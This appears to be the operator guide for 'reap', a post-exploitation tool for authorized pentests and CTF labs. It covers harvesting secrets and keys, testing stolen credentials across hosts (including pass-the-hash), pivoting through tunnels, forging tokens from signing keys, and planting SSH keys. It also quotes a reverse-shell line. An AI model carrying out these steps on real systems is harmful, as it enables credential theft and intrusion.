---
title: "reap — Operator Playbook"
subtitle: "Post-exploitation loot & credential-reuse framework — operator guide"
---

# What reap is (and isn't)

reap runs **after** you already have access to a target. **You** get the foothold
(exploit, creds, RCE, a caught shell). reap connects to that access and does the tedious
part: it harvests loot (secrets, configs, keys, env vars, privesc signals), tests every
discovered credential against every discovered service, and hands you a ranked findings
list and a report.

- reap does **not** exploit anything and does **not** get the shell for you.
- You give it a working **exec channel** (a "session"); it loots and correlates over it.
- The loop is always the same: **register → run → review → report**.
- The loot store (SQLite) **persists across hops**, so correlation gets smarter the deeper you go.

> **Golden rule:** web RCE → the `webshell` adapter; an interactive shell or creds → get
> to `ssh` / `winrm`. reap meets you at a *stable exec channel*, not a raw shell.

---

# Core concepts

Read this once and the rest of the guide (and the command reference) will make sense.

**Session** — one exec channel to one target. You create it with `register`. A module can
run identically whether the session is SSH, WinRM, a webshell, or a pwncat handoff, because
everything talks to the target through one `exec()` contract.

**Session ID** — the stable handle reap prints when you register, and lists under
`sessions`. Its shape tells you what it is:

| Adapter | Session ID looks like |
|---|---|
| ssh | `ssh:bob@10.10.10.5:22` |
| winrm | `winrm:svc_admin@10.10.10.20:5985` |
| webshell | `webshell:10.10.10.9` |
| handoff | `handoff:bob@10.10.10.5:22` |

**Active session** — the session commands act on **by default**. It's the one you most
recently registered (marked `*` in `sessions`). Every command that shows `[id]` takes an
**optional** session id to target a *different* session; omit it to use the active one.
Switch the active session with `use <id>`.

```
reap> sessions
  *  ssh:bob@10.10.10.5:22      (active)
     webshell:10.10.10.9
reap> run                         # runs against ssh:bob@... (the active one)
reap> run webshell:10.10.10.9     # runs against a specific session instead
```

**Fingerprint / Context** — a cheap probe reap runs to learn the box: OS, privilege,
language runtimes, container, domain membership. It gates which modules fire. reap
fingerprints **automatically** when you `register` (and before the first `run`), and prints:

```
os=linux priv=service runtime=[php,mysql] container=False minimal=False domain=False
```

You rarely run it by hand — do so only to **retry** if reap warned the first probe was
truncated (slow/lossy channel), or to re-print the context.

**Findings** — everything reap surfaces, ranked by severity (`high` → `medium` → `low`).
Four types:

- **credential** — a password / hash / SSH key you can use. Correlation tests these.
- **capability** — a key that *unlocks an action* rather than a login (e.g. a JWT signing
  secret). reap tells you what to do with it; it doesn't log in.
- **misconfig** — a privesc / lateral signal (sudo NOPASSWD, SUID, writable cron, …).
- **info** — context (discovered users, listening services, sensitive file paths).

**Loot store** — one SQLite DB per engagement (`--db engagement.db`). Every module writes
here; correlation reads here. It **persists across hops**, so a password looted on host A is
automatically tested against host B once you register it.

---

# Install & update

## Install (once per Kali)

reap is a git repo / self-contained pip package. Get the project onto the box — `git clone`
it, or copy the folder over (scp / rsync / USB) — then run the installer. It has two modes:

```
cd ~/reap                        # the project folder

./install.sh                     # local .venv + core        (then: source .venv/bin/activate)
./install.sh --full              # local .venv + all optional backends
./install.sh --pipx --full       # GLOBAL, editable `reap` command + all backends (via pipx)
```

For the `.venv` modes: `source .venv/bin/activate && reap`. For `--pipx`: just `reap`.

- Flags combine freely; `./install.sh --help` lists them: `--db`, `--win`, `--full`,
  `--pipx`, `--with-pwncat`, `--trusted-host`.
- Behind a TLS-intercepting proxy, add **`--trusted-host`** (e.g. `./install.sh --pipx --full --trusted-host`).
- `--pipx` needs pipx: `sudo apt install -y pipx && pipx ensurepath` (then open a new shell).
- `python3 -m venv` fails → `sudo apt install -y python3-venv python3-pip`.

## Update (editable install — just refresh the files)

Both modes install **editable**, so updating is just refreshing the source — no reinstall:

```
cd ~/reap && git pull                              # if you cloned from a remote
# or copy the source over an existing checkout (from a Windows/OneDrive path via WSL) — one line:
rsync -a --exclude .venv --exclude .git --exclude '*.db' --exclude loot "/mnt/c/<path>/Offensive Framework/" ~/reap/
```

New code is live on the next `run`. Only re-run the installer if a new **dependency** was added
— then `./install.sh --full` again, or `pipx inject reap <pkg>` for a pipx install.

## A global `reap` without pipx (optional)

If you used a local `.venv` and just want `reap` on your PATH without activating:

```
alias reap='~/reap/.venv/bin/reap'   # add to ~/.bashrc
```

---

# Quickstart

```
reap --db engagement.db             # start with a named store to keep an engagement together

reap> register ssh 10.10.10.5 bob 'S3cret!'   # 1. attach (auto-fingerprints)
reap> run                                      # 2. loot + auto-correlate
reap> creds                                    # 3a. recovered creds + what they unlocked
reap> findings                                 # 3b. ranked loot
reap> report engagement.md                     # 4. write the report
reap> register ssh 10.10.10.6 alice 'pw2'      # 5. pivot — the loot DB carries across hosts
```

---

# Pick your adapter by what your foothold IS

| Your foothold | Register it with |
|---|---|
| SSH password | `register ssh <ip> <user> <password>` |
| SSH private key | `register ssh <ip> <user> --key /path/key [--port 22]` |
| Windows + WinRM creds | `register winrm <ip> <user> <password> [--ssl] [--port 5985]` |
| Web shell / HTTP RCE | `register webshell <url> [--param cmd] [--method GET|POST] [--shell sh|cmd]` |
| Raw reverse/bind shell (nc) | upgrade it first (see *Recipes → raw shell*) |

After `register`, reap auto-fingerprints and prints e.g. `os=linux priv=service
runtime=[php,mysql]`. If it says `os=unknown`, the channel isn't returning command output —
see *Troubleshooting*.

---

# What reap collects

`run` fires every module whose trigger matches the fingerprint. Coverage at a glance:

**Secrets & configs (any Linux/unknown box)**
- `secret_scanner` — one broad grep for connection strings, `KEY=`/`PASSWORD=` assignments,
  AWS keys, JWT secrets, and PEM private keys across app/config roots.
- `config_harvester` — the same secrets, filtered to config files (`.env`/`.json`/`.yml`/…).
- `known_filenames` — a data-driven list of sensitive files (`.env`, `wp-config.php`,
  `id_rsa`, `.git-credentials`, cloud creds, and a Windows/AD set). Add a filename → grow the tool.
- `env_dumper` — `/proc/<pid>/environ` for app processes (twelve-factor apps hide secrets here).

**App-runtime secrets (fire when that runtime is detected)**
- `node` — `.env`, PM2 config, JWT signing secret (**capability**).
- `python` — Django/Flask `SECRET_KEY` (**capability**).
- `php` — Laravel `APP_KEY` / Symfony `APP_SECRET` (**capability**).
- `dotnet` — `web.config` / `appsettings.json`, ASP.NET `machineKey` (**capability**).
- `jwt_keys` — RS256 PEM signing keys as a `jwt_sign` **capability**.

**Privilege-escalation signals (Linux)**
- `sudo_privesc` — `sudo -n -l`, non-standard SUID, capabilities, writable cron.

**Lateral & pivot intel**
- `system_users` — real shell accounts (seeds correlation usernames).
- `listening_services` — local listeners → correlation targets (proto inferred from the process).
- `pivot_targets` — `~/.ssh/config`, `known_hosts`, `/etc/hosts`, arp → *neighbor* hosts to test.
- `cloud_creds` — `~/.aws` secret key, `~/.kube`, `~/.docker` (decoded), gcloud.
- `db_artifacts` — `.sql` / `.sqlite` dumps → creds and password hashes.
- `kerberos_sessions` — krb5 ccache/keytab, and attachable tmux/screen sockets.

**Windows / AD (no upload — built-in cmd/PowerShell over any channel)**
- `windows_loot` — PowerShell history, unattend/sysprep, GPP cpassword (auto-decrypted),
  `cmdkey` saved creds, KeePass/vault locate, SAM-theft hints when SYSTEM.
- `windows_registry` — Winlogon autologon, WinSCP/VNC (**capability**), PuTTY sessions.
- `windows_users` — `net user` / `net group` → correlation username seeds.

**Heavy enumeration (opt-in, off by default)**
- `linpeas` / `winpeas` / `lazagne` / `sharphound` — see *Heavy enumeration*.

---

# Credential reuse & pivots (the headline feature)

After every `run`, reap correlates: it tests each discovered credential against each
compatible discovered service, using usernames it found on the box (`/etc/passwd`,
`net user`, Winlogon) plus the obvious defaults. This is where lateral movement comes from.

| Credential kind | Tested against |
|---|---|
| `password` | ssh · winrm · smb · mysql · postgres · mongodb · mssql · ftp |
| `ssh_key` | ssh (encrypted keys are paired with recovered passwords as passphrases) |
| `hash` (NTLM) | smb · winrm — **pass-the-hash** (tested, never cracked) |
| `capability` | never tested — surfaced with its unlock action (see below) |

```
reap> register ssh host-a user 'pw'
reap> run                     # loots host-a, finds a DB password
reap> register ssh host-b user2 'pw2'
reap> run                     # loots host-b
reap> correlate               # re-test ALL creds vs ALL services across both hosts
reap> creds                   # the 'verified against' column shows confirmed pivots
```

A confirmed reuse prints as:

```
REUSE  /var/www/app/.env → webadmin@10.10.10.5:22 (ssh)
```

That's a handed-to-you pivot: `register ssh 10.10.10.5 webadmin '<that password>'` and keep going.

**Lockout-sensitive engagements:** correlation de-dupes attempts and skips already-verified
pairs by default. For real AD targets, throttle it — the engine supports `no_spray`,
`max_attempts_per_host`, and a per-attempt `delay` (see the correlation module).

---

# Capability findings (don't try to log in with these)

Some loot isn't a password to spray — it's a key that unlocks an action. reap tags these
`capability`, ranks them at the top of `findings`, and tells you what to do:

| Capability | reap reports | You do (offline) |
|---|---|---|
| `jwt_sign` | JWT signing secret / RS256 key | Forge an admin JWT (jwt.io, pyjwt) |
| `laravel_appkey` | Laravel `APP_KEY` | Forge/decrypt Laravel cookies (laravel-crypto-killer) |
| `symfony_appsecret` | Symfony `APP_SECRET` | Forge CSRF / remember-me / signed URIs |
| `django_secret` / `flask_secret` | framework `SECRET_KEY` | Forge/resign session cookies (flask-unsign) |
| `aspnet_machinekey` | ASP.NET machineKey | Forge ViewState (ysoserial.net) |
| `gpp_cpassword` | GPP cpassword from SYSVOL | reap auto-decrypts it (static AES key) → becomes a usable password |
| `winscp_password` / `vnc_password` | saved WinSCP/VNC secret | Decrypt (winscppasswd / vncpwd) |
| `kube_config` | kubeconfig token/cert | `kubectl --kubeconfig <path> auth can-i --list` |

---

# Recipes

## You have SSH (password or key)

```
reap> register ssh 10.10.10.5 bob 'S3cret!'
reap> register ssh 10.10.10.5 bob --key ~/loot/id_ed25519    # or with a key
reap> run
```

reap also *finds* keys for you: any `id_rsa`/`id_ed25519` in a readable home shows up under
`creds` as an `ssh_key`, and correlation tries it against discovered SSH services automatically.

## You have a web shell / HTTP RCE (the common one)

If you can hit a URL that runs a command and returns its output, that URL **is** the session
— no reverse shell needed.

```
reap> register webshell http://target/uploads/sh.php
reap> run
```

- `--param NAME` if the command parameter isn't `cmd`.
- `--method GET` if it's a GET shell (default POST).
- `--shell cmd` if it's a Windows/cmd.exe webshell (default `sh`).
- Self-signed HTTPS is fine — reap skips TLS verification by default (like `curl -k`).

**Worked example (a GET-based command-injection endpoint).** Say your manual PoC was a GET
request with a `cmd` parameter over self-signed TLS. Skip the reverse shell and register the
URL directly:

```
reap> register webshell https://10.10.10.7/vuln.php --method GET
reap> run
reap> creds        # e.g. the app's MySQL password from its config files
```

Notes:
- **Don't** register a blocking reverse-shell command. reap sends commands that *return*
  (`id`, `grep`, `cat`); a `bash -i >& /dev/tcp/...` would hang the request.
- **GET vs POST:** GET puts the whole command in the URL, so big `grep` sweeps can hit
  URL-length limits. If a module errors on GET, try `--method POST`.

## Your web user is nologin (can't SSH) — the webshell-to-pivot pattern

This is exactly why `webshell` exists. The web user (e.g. `www-data`) can't SSH, but you have
RCE. Loot the host, then let correlation find the credential that DOES get you a real shell:

```
reap> register webshell http://target/uploads/sh.php
reap> run
reap> creds        # a DB/.env password reused by a real user → SSH pivot
reap> register ssh <ip> <thatuser> '<thatpassword>'
reap> run
```

## You caught a raw reverse/bind shell (nc)

reap can't drive a raw socket by design. Upgrade it first (the pwncat-vl flow reap is built around):

1. Catch and stabilize the shell in **pwncat-vl**.
2. Drop your SSH public key into the user's `~/.ssh/authorized_keys` (or add a user).
3. `register ssh <ip> <user> --key <yourkey>`.

No SSH possible (nologin, no sshd)? If you still have command exec, write a webshell to a
web-served path and use `register webshell` instead.

## Windows / WinRM

```
reap> register winrm 10.10.10.20 svc_admin 'P@ssw0rd' --ssl
reap> run
```

On a domain-joined host, set `REAP_HEAVY=1` before launching to enable SharpHound. Windows
app with RCE but no WinRM creds? Drop a webshell on the IIS app (`--shell cmd`) instead.

## Reach an internal / loopback-only service (port forwarding)

A service bound to the target's `127.0.0.1` (a DB, admin panel, second SSH) isn't reachable
from Kali — but reap already holds your SSH session, so it tunnels there itself (`ssh -L`
in-process, no second terminal). Needs an **SSH-backed** session (`register ssh` / pwncat
handoff); a `webshell` can't forward.

**Automatic** — on `run`, loopback-bound DB/SSH/etc. are forwarded and registered so
`correlate` reaches them:

```
reap> register ssh 10.10.10.5 haris --key ~/.ssh/id_rsa
reap> run
  auto-forward 127.0.0.1:24306 → 10.10.10.5 loopback mysql/3306
reap> correlate
  REUSE  /var/www/app/config.php -> svc_db@127.0.0.1:24306 (mysql)
```
(Disable with `REAP_NO_AUTOFORWARD=1`.)

**Manual** — forward anything reachable from the foothold, including a *different* internal
host, then point an adapter (or `correlate`) at the local port:

```
reap> forward 127.0.0.1 1337                         # the foothold's own :1337
reap> forward 10.10.20.50 22 2222                    # a second box, only reachable from here
reap> register ssh 127.0.0.1 arthur 'pw' --port 2222 # loot box two through the pivot
reap> forwards                                       # list;  unforward 2222  closes one
```

The loot store persists across hops, so creds from the foothold correlate against the
forwarded/internal services automatically.

## Minimal userland (busybox / Alpine)

Fingerprint flags `minimal_userland=True`. reap doesn't try to stabilize these — route the
original shell through **pwncat-vl's busybox helper**, get to SSH/webshell, then register.

## Headless / scripted (no REPL)

Use the driver — handy for automation, or when a webshell sweep is slow in the console:

```
python reap_run.py 'webshell:http://target/sh.php' engagement.db
python reap_run.py 'webshell:GET:cmd:http://target/sh.php' engagement.db   # method:param
python reap_run.py 'ssh:user:pass@10.10.10.5' engagement.db
python reap_run.py 'ssh-key:user@10.10.10.5:/path/key' engagement.db
```

---

# Command reference

Most commands act on the **active session** (see *Core concepts*). Where you see `[id]`, it's
an **optional** session id — pass one (as shown by `sessions`) to target a different session,
or omit it to use the active one.

| Command | What it does | Example |
|---|---|---|
| `register <adapter> <args>` | Attach to a foothold and auto-fingerprint it. Adapters: `ssh`, `winrm`, `webshell`, `handoff`. | `register ssh 10.10.10.5 bob 'S3cret!'` |
| `sessions` | List registered sessions; active marked `*`. | `sessions` |
| `use <id>` | Make another session the active one. | `use webshell:10.10.10.9` |
| `hosts` | List every discovered host (persists in the loot DB). | `hosts` |
| `fingerprint [id]` | Re-probe OS / privilege / runtimes. Runs automatically on `register`; use it to retry a truncated probe or re-print the context. | `fingerprint` |
| `run [id]` | Fire matched loot modules into the store, then auto-correlate. | `run` |
| `correlate` | Re-test all creds vs all services (incl. pass-the-hash); surface capabilities. | `correlate` |
| `forward <rhost> <rport> [lport]` | Tunnel a target-internal service to `127.0.0.1` through the active SSH session (like `ssh -L`); registers it for `correlate`. | `forward 127.0.0.1 3306` |
| `forwards` / `unforward <lport>` | List active port forwards / tear one down. | `forwards` |
| `creds` | Recovered credentials and which services each unlocked. | `creds` |
| `findings` (alias `loot`) | Ranked findings (high-severity & capabilities on top). | `findings` |
| `search <regex>` | Search findings by title / detail / note. | `search jwt` |
| `note <finding_id> <text>` | Annotate a finding; it appears in the report. | `note 12 used for foothold` |
| `report [file.md] [redact]` | Timeline + ranked findings to markdown. `redact` masks secrets. | `report engagement.md` |
| `export <creds\|targets\|json> [path]` | hydra/nxc user+pass lists, host:port targets, or full JSON. | `export creds` |
| `import <nmap.xml>` | Seed services from an nmap scan so correlation has targets pre-loot. | `import scan.xml` |
| `modules` | Show which modules match the active session's context. | `modules` |
| `help` / `exit` | Built-in help / quit. | `help` |

**Exports** land in the working directory: `export creds` writes `reap-users.txt`,
`reap-pass.txt`, `reap-userpass.txt`; `export targets` writes `reap-targets.txt`;
`export json` writes `reap-report.json`.

---

# Heavy enumeration (LinPEAS / WinPEAS / LaZagne / SharpHound)

Off by default (noisy and slow). Opt in and point reap at the binaries on your Kali:

```
export REAP_HEAVY=1
export REAP_LINPEAS=/usr/share/peass/linpeas/linpeas.sh
export REAP_WINPEAS=/usr/share/peass/winpeas/winPEASx64.exe
export REAP_LAZAGNE=/opt/LaZagne.exe
export REAP_SHARPHOUND=/usr/share/sharphound/SharpHound.exe
reap
```

They upload, run, capture output to `loot/<host>/`, and feed secrets back through the normal
pipeline. SharpHound also needs a domain-joined Windows context and an `upload`-capable channel.

---

# Troubleshooting

| Symptom | Likely cause / fix |
|---|---|
| `os=unknown` after register | Channel isn't returning output. For webshell, check `--method` (GET vs POST), `--param`, and that the shell echoes output (`system`/`passthru`, not silent `shell_exec`). |
| "probe was truncated" warning | Slow/lossy channel cut the fingerprint short. Re-run `fingerprint`, or move to a better channel. |
| `connect failed` (ssh/winrm) | Wrong creds/port, or host unreachable. Confirm with a manual `ssh`/`evil-winrm` first. |
| `run` is very slow / times out | Webshell channel + broad sweeps. Use `reap_run.py`, `--method POST`, or pivot to SSH. |
| `0 findings` | Low privilege (e.g. `priv=service` can't read `/home/*`), or app in non-default paths. Pivot to a better user, then `run` again. |
| Correlation missed a known reuse | The username wasn't a candidate — confirm `run` executed `system_users`/`windows_users`, then `correlate`. |
| Pass-the-hash / MSSQL not tested | Install the extras: `pip install -e '.[full]'` (impacket, pymssql). |
| Lots of junk in `findings` | Minified JS / source matches. Rank by severity; focus on `high` / `capability`. Use `search` to filter. |

---

# Worked example — web RCE → root (a PHP/Laravel CRM)

A representative end-to-end run showing reap's role (box specifics genericized):

1. **Recon (manual):** vhost fuzz → a self-hosted git service + a PHP/Laravel CRM.
2. **Foothold (manual):** the git service's history leaked a DB password → reused on the CRM
   admin login → an authenticated file-upload → PHP webshell → RCE as `www-data`.
3. **reap takes over** — `www-data` is nologin, so:
   ```
   reap> register webshell http://crm.target.local/uploads/<id>.php
   reap> run
   ```
   reap looted the real `/var/www/app/.env` password and flagged a root-run sync script.
4. **Pivot:** that password was reused for SSH as a real user (correlation flags it) → user shell.
5. **Root (manual):** a root-run, world-readable script had a path-traversal flaw; a crafted
   input wrote my key to `/root/.ssh/authorized_keys` → `ssh root`.

reap owned steps 3–4 (the loot + the reuse pivot). Steps 1–2 and 5 were operator decisions —
exactly the split reap is designed for.

---

# Extending reap (add a runtime in ~30 lines)

A new runtime is a small plugin file plus, optionally, entries in
`reap/data/known_filenames.txt`. No engine/console changes.

```python
# reap/modules/plugins/myapp.py
from ..base import Module, register
from ...patterns import scan_line

@register
class MyAppPlugin(Module):
    name = "myapp_plugin"
    def triggers(self, ctx):
        return ctx.os == "linux" and ctx.has_runtime("python")
    def collect(self, session):
        out = session.exec("cat /etc/myapp/secrets.conf 2>/dev/null").stdout
        return scan_line(out, "/etc/myapp/secrets.conf")
```

Drop the file in `reap/modules/plugins/`; it's auto-discovered and runs on the next `run`.
Keep a running `FINDINGS_LOG.md` — every box that exposes loot your modules miss is the next
~30-line plugin.

---

# Scope & safety

- reap is for **authorized** engagements only (sanctioned pentests, CTF/HTB labs).
- Correlation stays **within the engagement**: it tests discovered credentials only against
  discovered services on hosts you registered. No external spraying.
- The loot DB and `report`/`export` files contain **plaintext credentials and private keys**.
  Treat them as sensitive, keep them out of synced folders, and clean them up per your rules
  of engagement.
